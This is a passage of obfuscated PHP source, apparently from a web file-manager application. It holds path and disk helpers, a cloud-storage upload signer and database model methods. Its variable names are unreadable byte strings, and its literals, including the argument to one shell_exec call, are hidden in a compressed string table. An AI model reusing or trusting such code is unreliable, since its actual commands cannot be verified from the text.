md5($õ⁄º‘ø [$†ÈÍ¸‹ß[78]] . $õ⁄º‘ø [$†ÈÍ¸‹ß[80]] . $õ⁄º‘ø [$†ÈÍ¸‹ß[86]]); } return $ãõó›À»; } public static function initSystemPath() { $»óßŸ¥Û =& $_SERVER[Çâä∆◊¡]; if (defined($»óßŸ¥Û[1260])) { return; } define($»óßŸ¥Û[1260], self::systemPath($»óßŸ¥Û[1261])); define($»óßŸ¥Û[1262], self::systemPath($»óßŸ¥Û[1263])); define($»óßŸ¥Û[1264], self::systemPath($»óßŸ¥Û[1265])); define($»óßŸ¥Û[1266], self::systemPath($»óßŸ¥Û[1267])); IOHistory::bindEvent(); } public static function systemPath($¢¬Ãçâí) { $¬¢Àáö  =& $_SERVER[Çâä∆◊¡]; $»äΩ˛ìÏ = $¬¢Àáö [1268] . ucfirst($¢¬Ãçâí); $ñ∂ï∂‹≠ = Model($¬¢Àáö [763])->get($»äΩ˛ìÏ); if ($ñ∂ï∂‹≠) { return $ñ∂ï∂‹≠; } if ($¢¬Ãçâí == $¬¢Àáö [1261]) { $ñ∂ï∂‹≠ = self::make(Model($¬¢Àáö [818])->systemRootPathAdd($¬¢Àáö [537])); } else { $ñ∂ï∂‹≠ = self::systemPath($¬¢Àáö [1261]); $Ï‘€òÒ˜ = self::sourceID($ñ∂ï∂‹≠); $ñ∂ï∂‹≠ = self::make(Model($¬¢Àáö [818])->mkdir($Ï‘€òÒ˜, $¢¬Ãçâí)); } Model($¬¢Àáö [763])->set($»äΩ˛ìÏ, $ñ∂ï∂‹≠); return $ñ∂ï∂‹≠; } public static function systemFolder($∆ÇÙÒÀ÷) { $î Í™…õ = IO_PATH_SYSTEM_SOURCE . $∆ÇÙÒÀ÷; $˜ÖÈÛ≈◊ = Cache::get($î Í™…õ); if (!$˜ÖÈÛ≈◊) { $∫÷˛ôÍÔ = IO::infoFull($î Í™…õ); if (!$∫÷˛ôÍÔ) { $˜ÖÈÛ≈◊ = IO::mkdir($î Í™…õ, REPEAT_SKIP); } else { $˜ÖÈÛ≈◊ = $∫÷˛ôÍÔ[$_SERVER[Çâä∆◊¡][78]]; } Cache::set($î Í™…õ, $˜ÖÈÛ≈◊, 3600 * 10); } return $˜ÖÈÛ≈◊; } public static function defaultDriver() { return Model($_SERVER[Çâä∆◊¡][760])->defaultDriver(); } public static function defaultIO() { $»‚Èß’˛ =& $_SERVER[Çâä∆◊¡]; $∂µÄö“™ = self::defaultDriver(); return $»‚Èß’˛[1269] . $∂µÄö“™[$»‚Èß’˛[401]] . $»‚Èß’˛[1258]; } public static function defaultDriverInit() { static $ô¡ù¸≠˛ = false; if ($ô¡ù¸≠˛) { return $ô¡ù¸≠˛; } $ô¡ù¸≠˛ = IO::init(self::defaultIO()); return $ô¡ù¸≠˛; } public static function fileTypeList() { $Ç•äõõﬁ =& $_SERVER[Çâä∆◊¡]; $ÉãËƒ˚ì = $GLOBALS[$Ç•äõõﬁ[6]][$Ç•äõõﬁ[1270]]; foreach ($ÉãËƒ˚ì as $ü–ıèç¿ => $ú≤«∫Å˜) { $˜Àú˝˙Ï = $Ç•äõõﬁ[1271] . $ü–ıèç¿; $Æπ™´◊å = LNG($˜Àú˝˙Ï); if ($˜Àú˝˙Ï != $Æπ™´◊å) { $ÉãËƒ˚ì[$ü–ıèç¿][$Ç•äõõﬁ[32]] = $Æπ™´◊å; } } return $ÉãËƒ˚ì; } public static function diskList($†·£ÙÄñ = true) { $¥®çÅßµ = $_SERVER[Çâä∆◊¡][1272]; if ($†·£ÙÄñ) { $√ª‹Î€∫ = Cache::get($¥®çÅßµ); if (is_array($√ª‹Î€∫)) { return $√ª‹Î€∫; } } $√ª‹Î€∫ = self::diskListGet(); Cache::set($¥®çÅßµ, $√ª‹Î€∫, 60); return $√ª‹Î€∫; } public static function diskListGet() { $∑úûÃ»ª =& $_SERVER[Çâä∆◊¡]; $À’ïé‹» = array(); if ($GLOBALS[$∑úûÃ»ª[6]][$∑úûÃ»ª[1273]] == $∑úûÃ»ª[1274]) { $’˛¿ô— = $∑úûÃ»ª[1275]; for ($ÏÄøÇ›Ç = 0; $ÏÄøÇ›Ç < strlen($’˛¿ô—); $ÏÄøÇ›Ç++) { $¨ıâßì˚ = $’˛¿ô—[$ÏÄøÇ›Ç] . $∑úûÃ»ª[1276]; if (file_exists($¨ıâßì˚)) { $À’ïé‹»[] = $¨ıâßì˚; } } return $À’ïé‹»; } if (!function_exists($∑úûÃ»ª[99])) { $À’ïé‹»[] = $∑úûÃ»ª[828]; return $À’ïé‹»; } $∂´áƒÔà = explode($∑úûÃ»ª[226], shell_exec($∑úûÃ»ª[1277])); array_shift($∂´áƒÔà); array_pop($∂´áƒÔà); $èÕá‹Äú = array($∑úûÃ»ª[1278], $∑úûÃ»ª[1279], $∑úûÃ»ª[1280], $∑úûÃ»ª[1281], $∑úûÃ»ª[1282], $∑úûÃ»ª[1283], $∑úûÃ»ª[1284], $∑úûÃ»ª[1285]); foreach ($∂´áƒÔà as $∏ÿΩÀõ¶) { $ëﬁÕ≤ãÑ = preg_split($∑úûÃ»ª[1286], $∏ÿΩÀõ¶); $¨ıâßì˚ = $ëﬁÕ≤ãÑ[count($ëﬁÕ≤ãÑ) - 1]; if (!strstr($ëﬁÕ≤ãÑ[0], $∑úûÃ»ª[1287]) || !$¨ıâßì˚) { continue; } $îìÒΩë™ = rtrim($¨ıâßì˚, $∑úûÃ»ª[8]) . $∑úûÃ»ª[8]; if (in_array($îìÒΩë™, $èÕá‹Äú)) { continue; } $À’ïé‹»[] = $îìÒΩë™; } return $À’ïé‹»; } public static function isSameDisk($±ﬂœë∫˝, $Ÿß¢»Õ„) { $É’‹Êã√ =& $_SERVER[Çâä∆◊¡]; if ($GLOBALS[$É’‹Êã√[6]][$É’‹Êã√[1273]] == $É’‹Êã√[1274]) { return strtolower(substr($±ﬂœë∫˝, 0, 1)) == strtolower(substr($Ÿß¢»Õ„, 0, 1)); } $ﬂöıáËÉ = self::diskList(); $õÙ‘ä¯± = !1; $ßÑåú„Ÿ = !1; sort($ﬂöıáËÉ); $ﬂöıáËÉ = array_reverse($ﬂöıáËÉ); $±ﬂœë∫˝ = rtrim($±ﬂœë∫˝, $É’‹Êã√[8]) . $É’‹Êã√[8]; $Ÿß¢»Õ„ = rtrim($Ÿß¢»Õ„, $É’‹Êã√[8]) . $É’‹Êã√[8]; foreach ($ﬂöıáËÉ as $¶øÂ›≠‚) { $˜√Ç∏ŸÜ = strlen($¶øÂ›≠‚); if (!$õÙ‘ä¯± && substr($±ﬂœë∫˝, 0, $˜√Ç∏ŸÜ) == $¶øÂ›≠‚) { $õÙ‘ä¯± = $¶øÂ›≠‚; } if (!$ßÑåú„Ÿ && substr($Ÿß¢»Õ„, 0, $˜√Ç∏ŸÜ) == $¶øÂ›≠‚) { $ßÑåú„Ÿ = $¶øÂ›≠‚; } if ($õÙ‘ä¯± && $ßÑåú„Ÿ) { break; } } return $õÙ‘ä¯± === $ßÑåú„Ÿ; } public static function transferType($ûı¿é’∫, $Ò††ﬁîÚ) { $›¢ç–ã⁄ =& $_SERVER[Çâä∆◊¡]; $ıßÆ› º = self::driverType($ûı¿é’∫); $ƒ¢˙ ê® = self::driverType($Ò††ﬁîÚ); if ($ıßÆ› º[$›¢ç–ã⁄[33]] == $ƒ¢˙ ê®[$›¢ç–ã⁄[33]] && $ıßÆ› º[$›¢ç–ã⁄[1288]] == $ƒ¢˙ ê®[$›¢ç–ã⁄[1288]]) { return $›¢ç–ã⁄[1289]; } if ($ıßÆ› º[$›¢ç–ã⁄[33]] == $›¢ç–ã⁄[857] && $ƒ¢˙ ê®[$›¢ç–ã⁄[33]] == $›¢ç–ã⁄[107]) { return $›¢ç–ã⁄[1184]; } if ($ıßÆ› º[$›¢ç–ã⁄[33]] == $›¢ç–ã⁄[107] && $ƒ¢˙ ê®[$›¢ç–ã⁄[33]] == $›¢ç–ã⁄[857]) { return $›¢ç–ã⁄[108]; } return $›¢ç–ã⁄[1290]; } public static function driverType($£µ£Ì¿Ï) { $Í°•ãÑ˘ =& $_SERVER[Çâä∆◊¡]; $£Â·ôﬁî = str_replace($Í°•ãÑ˘[1291], $Í°•ãÑ˘[12], strtolower($£µ£Ì¿Ï->getType())); if ($£Â·ôﬁî == $Í°•ãÑ˘[751] || $£Â·ôﬁî == $Í°•ãÑ˘[1292] || $£Â·ôﬁî == $Í°•ãÑ˘[1293]) { $£µ£Ì¿Ï = self::defaultDriverInit(); } else { if ($£Â·ôﬁî == $Í°•ãÑ˘[1191] || $£Â·ôﬁî == $Í°•ãÑ˘[1294]) { $£µ£Ì¿Ï = IO::init($£µ£Ì¿Ï->pathParse[$Í°•ãÑ˘[1138]]); } } $Œõñ˜ìú = $£µ£Ì¿Ï->path; $£Â·ôﬁî = str_replace($Í°•ãÑ˘[1291], $Í°•ãÑ˘[12], strtolower($£µ£Ì¿Ï->getType())); if ($£Â·ôﬁî == $Í°•ãÑ˘[107]) { return array($Í°•ãÑ˘[33] => $Í°•ãÑ˘[107], $Í°•ãÑ˘[1288] => $Í°•ãÑ˘[12], $Í°•ãÑ˘[78] => $Œõñ˜ìú); } return array($Í°•ãÑ˘[33] => $Í°•ãÑ˘[857], $Í°•ãÑ˘[1288] => $£µ£Ì¿Ï->pathDriver, $Í°•ãÑ˘[78] => $Œõñ˜ìú); } public static function pathDriverType($«ˆÕ∑∂Å) { return $«ˆÕ∑∂Å ? self::driverType(IO::init($«ˆÕ∑∂Å)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($‰µƒ°òË) { parent::__construct($‰µƒ°òË); $this->signatureVersion($_SERVER[Çâä∆◊¡][211]); } public function uploadFormData($ã¸éõ˝ï, $‘å¿Ù‰é = 3600) { $ÓÏŸ∑´Ó =& $_SERVER[Çâä∆◊¡]; $⁄ﬁ£˙õé = $ÓÏŸ∑´Ó[191]; $»∏≤›€Ÿ = $ÓÏŸ∑´Ó[227]; $≠ΩÔÿ¸π = $ÓÏŸ∑´Ó[1295]; $§æ±À¬˙ = gmdate($ÓÏŸ∑´Ó[1296], time() + $‘å¿Ù‰é); $ ÷†øñ´ = (string) time() . $ÓÏŸ∑´Ó[71] . (string) (time() + $‘å¿Ù‰é); $«ö…Â◊ú = array($ÓÏŸ∑´Ó[1297] => $§æ±À¬˙, $ÓÏŸ∑´Ó[1298] => array(array($ÓÏŸ∑´Ó[1299] => $⁄ﬁ£˙õé), array($ÓÏŸ∑´Ó[1300] => $this->bucket), array($ÓÏŸ∑´Ó[1301], $ÓÏŸ∑´Ó[1302], $ÓÏŸ∑´Ó[12]), array($ÓÏŸ∑´Ó[1303] => $≠ΩÔÿ¸π), array($ÓÏŸ∑´Ó[1304] => $»∏≤›€Ÿ), array($ÓÏŸ∑´Ó[1305] => $this->accessKey), array($ÓÏŸ∑´Ó[1306] => $ ÷†øñ´))); $«ö…Â◊ú = json_encode($«ö…Â◊ú); $ÚÎ⁄≈à˜ = hash_hmac($ÓÏŸ∑´Ó[227], $ ÷†øñ´, $this->secret); $¸˘√√ëÁ = sha1($«ö…Â◊ú); $·±ùèÖ‘ = hash_hmac($ÓÏŸ∑´Ó[227], $¸˘√√ëÁ, $ÚÎ⁄≈à˜); $óøØóﬁ¶ = array($ÓÏŸ∑´Ó[1299] => $⁄ﬁ£˙õé, $ÓÏŸ∑´Ó[1303] => $≠ΩÔÿ¸π, $ÓÏŸ∑´Ó[1307] => base64_encode($«ö…Â◊ú), $ÓÏŸ∑´Ó[1304] => $»∏≤›€Ÿ, $ÓÏŸ∑´Ó[1305] => $this->accessKey, $ÓÏŸ∑´Ó[1308] => $ ÷†øñ´, $ÓÏŸ∑´Ó[1309] => $·±ùèÖ‘, $ÓÏŸ∑´Ó[174] => $this->getHost()); return $óøØóﬁ¶; } public function fileOutLink($≈¨ö‹Ü‘) { $™∏øÙÏå =& $_SERVER[Çâä∆◊¡]; if (substr($≈¨ö‹Ü‘, 0, 7) == $™∏øÙÏå[1310]) { $≈¨ö‹Ü‘ = $™∏øÙÏå[1311] . substr($≈¨ö‹Ü‘, 7); } header($™∏øÙÏå[158] . $≈¨ö‹Ü‘); die; } } goto DÈà€ÂÏù€; e‚ñà›€Ë’: define($_SERVER[Çâä∆◊¡][0], $_SERVER[Çâä∆◊¡][1]); $_SERVER[‰åñ∂çÏ] = explode($_SERVER[Çâä∆◊¡][2], gzinflate(substr($_SERVER[Çâä∆◊¡][3], 10, -8))); function binCheckEq($˜¶˙åì√, $È—ïòŒâ) { return $˜¶˙åì√ == $È—ïòŒâ; } goto c¢œùÂ≥Ñ—; dêíç†ŸÌ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\x65", "\157\162\x64\x65\x72", "\x61\154\x69\141\163", "\150\x61\x76\151\156\147", "\x67\x72\x6f\165\x70", "\154\157\143\x6b", "\144\x69\163\164\151\156\143\164", "\x61\x75\x74\x6f", "\146\x69\154\164\x65\x72", "\166\x61\x6c\x69\144\141\x74\145", "\162\145\163\x75\154\164", "\x62\x69\156\x64", "\164\157\x6b\x65\156"); public function __construct($§Ú∫÷‘ë = '', $˘‡€êœÎ = '', $©˛¥¢»Í = '') { $Çá√Éº‡ =& $_SERVER[Çâä∆◊¡]; $this->_initialize(); if (!empty($§Ú∫÷‘ë)) { if (strpos($§Ú∫÷‘ë, $Çá√Éº‡[10])) { list($this->dbName, $this->name) = explode($Çá√Éº‡[10], $§Ú∫÷‘ë); } else { $this->name = $§Ú∫÷‘ë; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($˘‡€êœÎ)) { $this->tablePrefix = $Çá√Éº‡[12]; } elseif ($Çá√Éº‡[12] != $˘‡€êœÎ) { $this->tablePrefix = $˘‡€êœÎ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Çá√Éº‡[239]); } $this->db(0, empty($this->connection) ? $©˛¥¢»Í : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÓüÁä‡Ù =& $_SERVER[Çâä∆◊¡]; if (empty($this->fields)) { if (think_config($ÓüÁä‡Ù[240])) { $Ê‡å∫é– = $this->dbName ? $this->dbName : think_config($ÓüÁä‡Ù[241]); $»”⁄±∑Ü = think_var_cache($ÓüÁä‡Ù[242] . strtolower(get_path_this($Ê‡å∫é–) . $ÓüÁä‡Ù[10] . $this->name)); if ($»”⁄±∑Ü) { $èöÖ‚˝ù = think_config($ÓüÁä‡Ù[243]); if (empty($èöÖ‚˝ù) || $»”⁄±∑Ü[$ÓüÁä‡Ù[244]] == $èöÖ‚˝ù) { $this->fields = $»”⁄±∑Ü; return; } } } $this->flush(); } } public function flush() { $€◊ÉáóË =& $_SERVER[Çâä∆◊¡]; $this->db->setModel($this->name); $⁄®£πÌÈ = $this->db->getFields($this->getTableName()); if (!$⁄®£πÌÈ) { return !1; } $this->fields = array_keys($⁄®£πÌÈ); $this->fields[$€◊ÉáóË[245]] = !1; foreach ($⁄®£πÌÈ as $ÿü£Ÿµû => $Öéß¥Äê) { $ÃﬂßÇ¬[$ÿü£Ÿµû] = $Öéß¥Äê[$€◊ÉáóË[33]]; if ($Öéß¥Äê[$€◊ÉáóË[39]]) { $this->fields[$€◊ÉáóË[246]] = $ÿü£Ÿµû; if ($Öéß¥Äê[$€◊ÉáóË[42]]) { $this->fields[$€◊ÉáóË[245]] = !0; } } } $this->fields[$€◊ÉáóË[247]] = $ÃﬂßÇ¬; if (think_config($€◊ÉáóË[243])) { $this->fields[$€◊ÉáóË[244]] = think_config($€◊ÉáóË[243]); } if (think_config($€◊ÉáóË[240])) { $Á˝ûä÷í = $this->dbName ? $this->dbName : think_config($€◊ÉáóË[241]); think_var_cache($€◊ÉáóË[242] . strtolower(get_path_this($Á˝ûä÷í) . $€◊ÉáóË[10] . $this->name), $this->fields); } } public function switchModel($Ç˜”·∆°, $˘üØÇÂÀ = array()) { $ﬂ÷ªµÁû =& $_SERVER[Çâä∆◊¡]; $ÇŸ˜¨Ã = ucwords(strtolower($Ç˜”·∆°)) . $ﬂ÷ªµÁû[248]; if (!class_exists($ÇŸ˜¨Ã)) { think_exception($ÇŸ˜¨Ã . think_lang($ﬂ÷ªµÁû[249])); } $this->_extModel = new $ÇŸ˜¨Ã($this->name); if (!empty($˘üØÇÂÀ)) { foreach ($˘üØÇÂÀ as $◊Çﬂí°™) { $this->_extModel->setProperty($◊Çﬂí°™, $this->{$◊Çﬂí°™}); } } return $this->_extModel; } public function __set($ÖÄŒÊΩ≥, $‚ü◊—˚§) { $this->data[$ÖÄŒÊΩ≥] = $‚ü◊—˚§; } public function __get($∞¥ßâ≠ß) { return isset($this->data[$∞¥ßâ≠ß]) ? $this->data[$∞¥ßâ≠ß] : null; } public function __isset($ƒ¡¯–Â‰) { return isset($this->data[$ƒ¡¯–Â‰]); } public function __unset($ƒïÂ¯£∑) { unset($this->data[$ƒïÂ¯£∑]); } public function __call($”Õíå†ë, $ˆÿŒ˝◊•) { $Áòßãπç =& $_SERVER[Çâä∆◊¡]; if (in_array(strtolower($”Õíå†ë), $this->methods, !0)) { $this->options[strtolower($”Õíå†ë)] = $ˆÿŒ˝◊•[0]; return $this; } elseif (in_array(strtolower($”Õíå†ë), array($Áòßãπç[250], $Áòßãπç[251], $Áòßãπç[252], $Áòßãπç[253], $Áòßãπç[254]), !0)) { $™È€Ë€† = isset($ˆÿŒ˝◊•[0]) ? $ˆÿŒ˝◊•[0] : $Áòßãπç[181]; $™È€Ë€† = $this->db->parseKey($™È€Ë€†); return $this->getField(strtoupper($”Õíå†ë) . $Áòßãπç[255] . $™È€Ë€† . $Áòßãπç[256] . $”Õíå†ë, $Áòßãπç[250]); } elseif (strtolower(substr($”Õíå†ë, 0, 5)) == $Áòßãπç[257]) { $™È€Ë€† = think_parse_name(substr($”Õíå†ë, 5)); $ÍõâÏΩ¥[$™È€Ë€†] = $ˆÿŒ˝◊•[0]; return $this->where($ÍõâÏΩ¥)->find(); } elseif (strtolower(substr($”Õíå†ë, 0, 10)) == $Áòßãπç[258]) { $ı‹øÓ‚Ø = think_parse_name(substr($”Õíå†ë, 10)); $ÍõâÏΩ¥[$ı‹øÓ‚Ø] = $ˆÿŒ˝◊•[0]; return $this->where($ÍõâÏΩ¥)->getField($ˆÿŒ˝◊•[1]); } elseif (isset($this->_scope[$”Õíå†ë])) { return $this->scope($”Õíå†ë, $ˆÿŒ˝◊•[0]); } elseif (method_exists($this, $”Õíå†ë)) { array_unshift($ˆÿŒ˝◊•, $”Õíå†ë); return call_user_func_array(array($this, $Áòßãπç[259]), $ˆÿŒ˝◊•); } else { return call_user_func_array(array(parent, $”Õíå†ë), $ˆÿŒ˝◊•); } } protected function call() { $êÉ®±òµ =& $_SERVER[Çâä∆◊¡]; $∏¬ä–ßâ = func_get_args(); $çïÏÎúí = array_shift($∏¬ä–ßâ); $£Ü‘úÜß = $çïÏÎúí; if (is_array($çïÏÎúí)) { $£Ü‘úÜß = $çïÏÎúí[1]; $çïÏÎúí = $çïÏÎúí[0]; } $àËπıç™ = count($∏¬ä–ßâ) - 1; if (isset($∏¬ä–ßâ[$àËπıç™]) && $∏¬ä–ßâ[$àËπıç™] === $çïÏÎúí) { think_exception(__CLASS__ . $êÉ®±òµ[4] . $çïÏÎúí . think_lang($êÉ®±òµ[260])); return; } $∏¬ä–ßâ[] = $çïÏÎúí; if (method_exists($this, $êÉ®±òµ[261])) { $ã≠±Å‡Ô = call_user_func_array(array($this, $êÉ®±òµ[262]), array($£Ü‘úÜß, $∏¬ä–ßâ)); if (!is_null($ã≠±Å‡Ô) && $ã≠±Å‡Ô !== !1) { return $ã≠±Å‡Ô; } } $Ç √¨‹£ = call_user_func_array(array($this, $çïÏÎúí), $∏¬ä–ßâ); if (method_exists($this, $êÉ®±òµ[263])) { $ã≠±Å‡Ô = call_user_func_array(array($this, $êÉ®±òµ[264]), array($£Ü‘úÜß, $∏¬ä–ßâ, $Ç √¨‹£)); if ($ã≠±Å‡Ô) { return $ã≠±Å‡Ô; } } return $Ç √¨‹£; } protected function _initialize() { } protected function _facade($∫•∫≠π‡) { $†ﬁ„”ûØ =& $_SERVER[Çâä∆◊¡]; if (!empty($this->fields)) { foreach ($∫•∫≠π‡ as $ÓÀíñ˝£ => $¨±∑ıΩ†) { if (is_array($this->fields) && !in_array($ÓÀíñ˝£, $this->fields, !0)) { unset($∫•∫≠π‡[$ÓÀíñ˝£]); } elseif (is_scalar($¨±∑ıΩ†)) { $this->_parseType($∫•∫≠π‡, $ÓÀíñ˝£); } } } if (!empty($this->options[$†ﬁ„”ûØ[265]])) { $∫•∫≠π‡ = array_map($this->options[$†ﬁ„”ûØ[265]], $∫•∫≠π‡); unset($this->options[$†ﬁ„”ûØ[265]]); } $this->_beforeWrite($∫•∫≠π‡); return $∫•∫≠π‡; } protected function _beforeWrite(&$⁄Ÿàﬁß˚) { } public function add($≈‰µ®Èí = '', $∑—Ôò·ë = array(), $íÌç⁄‚Ã = false) { if (empty($≈‰µ®Èí)) { if (!empty($this->data)) { $≈‰µ®Èí = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Çâä∆◊¡][266]); return !1; } } $∑—Ôò·ë = $this->_parseOptions($∑—Ôò·ë); $≈‰µ®Èí = $this->_facade($≈‰µ®Èí); if (!1 === $this->_beforeInsert($≈‰µ®Èí, $∑—Ôò·ë)) { return !1; } $«˝åëæ¿ = $this->db->insert($≈‰µ®Èí, $∑—Ôò·ë, $íÌç⁄‚Ã); if (!1 !== $«˝åëæ¿) { $∏±◊◊õÎ = $this->getLastInsID(); if ($∏±◊◊õÎ) { $≈‰µ®Èí[$this->getPk()] = $∏±◊◊õÎ; $this->_after_insert($≈‰µ®Èí, $∑—Ôò·ë); return $∏±◊◊õÎ; } $this->_after_insert($≈‰µ®Èí, $∑—Ôò·ë); } return $«˝åëæ¿; } protected function _beforeInsert(&$ï‡ÅÃ”Á, $ô¬”ÅÍû) { } protected function _after_insert($¬∞°¶˘Ω, $¿Ç›ŸºÈ) { } public function addAll($ñ«‹†˘§, $ı–Ó˜§€ = array(), $´ÙÎ´ˆä = false) { $¢ÜøÓ˜€ =& $_SERVER[Çâä∆◊¡]; if (empty($ñ«‹†˘§)) { $this->error = think_lang($¢ÜøÓ˜€[266]); return !1; } $ı–Ó˜§€ = $this->_parseOptions($ı–Ó˜§€); foreach ($ñ«‹†˘§ as $˛§™‡€∫ => $çµíÅËÙ) { $ñ«‹†˘§[$˛§™‡€∫] = $this->_facade($çµíÅËÙ); } if (method_exists($this->db, $¢ÜøÓ˜€[267])) { $á≠¸ﬂúÀ = $this->db->insertAll($ñ«‹†˘§, $ı–Ó˜§€, $´ÙÎ´ˆä); } else { $this->startTrans(); foreach ($ñ«‹†˘§ as $˛§™‡€∫ => $çµíÅËÙ) { $á≠¸ﬂúÀ = $this->db->insert($çµíÅËÙ, $ı–Ó˜§€, $´ÙÎ´ˆä); } $this->commit(); } if (!1 !== $á≠¸ﬂúÀ) { $®¥‹∆´è = $this->getLastInsID(); if ($®¥‹∆´è) { return $®¥‹∆´è; } } return $á≠¸ﬂúÀ; } public function selectAdd($Üˆ‚ßëÿ = '', $¿¥¿£„É = '', $Ã¿´äÚ = array()) { $ë≥Ü©ä◊ =& $_SERVER[Çâä∆◊¡]; $Ã¿´äÚ = $this->_parseOptions($Ã¿´äÚ); if (!1 === ($¶±ôîÔÀ = $this->db->selectInsert($Üˆ‚ßëÿ ? $Üˆ‚ßëÿ : $Ã¿´äÚ[$ë≥Ü©ä◊[268]], $¿¥¿£„É ? $¿¥¿£„É : $this->getTableName(), $Ã¿´äÚ))) { $this->error = think_lang($ë≥Ü©ä◊[269]); return !1; } else { return $¶±ôîÔÀ; } } public function save($ùÒŒ†–Á = '', $ç´Ä„¢” = array()) { $Å”Æ«ƒ∂ =& $_SERVER[Çâä∆◊¡]; if (empty($ùÒŒ†–Á)) { if (!empty($this->data)) { $ùÒŒ†–Á = $this->data; $this->data = array(); } else { $this->error = think_lang($Å”Æ«ƒ∂[266]); return !1; } } $ùÒŒ†–Á = $this->_facade($ùÒŒ†–Á); $ç´Ä„¢” = $this->_parseOptions($ç´Ä„¢”); $¯Ò„òÏ‰ = $this->getPk(); if (!isset($ç´Ä„¢”[$Å”Æ«ƒ∂[270]])) { if (isset($ùÒŒ†–Á[$¯Ò„òÏ‰])) { $Ë˘ßãäû[$¯Ò„òÏ‰] = $ùÒŒ†–Á[$¯Ò„òÏ‰]; $ç´Ä„¢”[$Å”Æ«ƒ∂[270]] = $Ë˘ßãäû; unset($ùÒŒ†–Á[$¯Ò„òÏ‰]); } else { $this->error = think_lang($Å”Æ«ƒ∂[269]); return !1; } } if (is_array($ç´Ä„¢”[$Å”Æ«ƒ∂[270]]) && isset($ç´Ä„¢”[$Å”Æ«ƒ∂[270]][$¯Ò„òÏ‰])) { $©œ≈ΩÒ© = $ç´Ä„¢”[$Å”Æ«ƒ∂[270]][$¯Ò„òÏ‰]; } if (!1 === $this->_beforeUpdate($ùÒŒ†–Á, $ç´Ä„¢”)) { return !1; } $†•‚íÅ± = $this->db->update($ùÒŒ†–Á, $ç´Ä„¢”); if (!1 !== $†•‚íÅ±) { if (isset($©œ≈ΩÒ©)) { $ùÒŒ†–Á[$¯Ò„òÏ‰] = $©œ≈ΩÒ©; } $this->_afterUpdate($ùÒŒ†–Á, $ç´Ä„¢”); } return $†•‚íÅ±; } protected function _beforeUpdate(&$˛ËáèóÒ, $äûÁŸÍ∞) { } protected function _afterUpdate($á¸Å“Õ¡, $È»÷ÕÍÚ) { } public function delete($¢’≥≠ï‘ = array()) { $ª’µó‘ç =& $_SERVER[Çâä∆◊¡]; if (empty($¢’≥≠ï‘) && empty($this->options[$ª’µó‘ç[270]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $˜ªç˚ˆ¢ = $this->getPk(); if (is_numeric($¢’≥≠ï‘) || is_string($¢’≥≠ï‘)) { if (strpos($¢’≥≠ï‘, $ª’µó‘ç[50])) { $ƒÜ¨‘‰¨[$˜ªç˚ˆ¢] = array($ª’µó‘ç[271], $¢’≥≠ï‘); } else { $ƒÜ¨‘‰¨[$˜ªç˚ˆ¢] = $¢’≥≠ï‘; } $this->options[$ª’µó‘ç[270]] = $ƒÜ¨‘‰¨; } $¢’≥≠ï‘ = $this->_parseOptions(); if (is_array($¢’≥≠ï‘[$ª’µó‘ç[270]]) && isset($¢’≥≠ï‘[$ª’µó‘ç[270]][$˜ªç˚ˆ¢])) { $π±® ‚Å = $¢’≥≠ï‘[$ª’µó‘ç[270]][$˜ªç˚ˆ¢]; } $òªëœ˜… = $this->db->delete($¢’≥≠ï‘); if (!1 !== $òªëœ˜…) { $Í∏õÇÏ˜ = array(); if (isset($π±® ‚Å)) { $Í∏õÇÏ˜[$˜ªç˚ˆ¢] = $π±® ‚Å; } $this->_after_delete($Í∏õÇÏ˜, $¢’≥≠ï‘); } return $òªëœ˜…; } protected function _after_delete($˝±—ÿçÒ, $îì®Ãß◊) { } public function select($√Ä”Ûè¢ = array()) { $˚‚°—°ª =& $_SERVER[Çâä∆◊¡]; if (is_string($√Ä”Ûè¢) || is_numeric($√Ä”Ûè¢)) { $ù¨Ó´Ñ‘ = $this->getPk(); if (strpos($√Ä”Ûè¢, $˚‚°—°ª[50])) { $ÙÂíü≤Ê[$ù¨Ó´Ñ‘] = array($˚‚°—°ª[271], $√Ä”Ûè¢); } else { $ÙÂíü≤Ê[$ù¨Ó´Ñ‘] = $√Ä”Ûè¢; } $this->options[$˚‚°—°ª[270]] = $ÙÂíü≤Ê; } elseif (!1 === $√Ä”Ûè¢) { $√Ä”Ûè¢ = $this->_parseOptions(); return $˚‚°—°ª[272] . $this->db->buildSelectSql($√Ä”Ûè¢) . $˚‚°—°ª[273]; } $√Ä”Ûè¢ = $this->_parseOptions(); $”˛ê´Ûï = $this->db->select($√Ä”Ûè¢); if (!1 === $”˛ê´Ûï) { return !1; } if (empty($”˛ê´Ûï)) { return null; } $this->_afterSelect($”˛ê´Ûï, $√Ä”Ûè¢); return $”˛ê´Ûï; } protected function _afterSelect(&$òêÎ±ÆÆ, $óß˚’®„) { } public function buildSql($›Ê≈í∏£ = array()) { $ó˙îÑ˜Ì =& $_SERVER[Çâä∆◊¡]; $›Ê≈í∏£ = $this->_parseOptions($›Ê≈í∏£); return $ó˙îÑ˜Ì[272] . $this->db->buildSelectSql($›Ê≈í∏£) . $ó˙îÑ˜Ì[273]; } public function optionsValue($»ﬁˆÈæÀ = null) { if (is_null($»ﬁˆÈæÀ)) { return $this->options; } elseif (is_array($»ﬁˆÈæÀ)) { $this->options = array_merge($this->options, $»ﬁˆÈæÀ); } } protected function _parseOptions($ΩÀ‡ß˜⁄ = array()) { $¢üê˛‹¢ =& $_SERVER[Çâä∆◊¡]; if (is_array($ΩÀ‡ß˜⁄)) { $ΩÀ‡ß˜⁄ = array_merge($this->options, $ΩÀ‡ß˜⁄); } $this->options = array(); if (!isset($ΩÀ‡ß˜⁄[$¢üê˛‹¢[274]])) { $ΩÀ‡ß˜⁄[$¢üê˛‹¢[274]] = $this->getTableName(); $˛°ãäù‡ = $this->fields; } else { $˛°ãäù‡ = $this->getDbFields(); } if 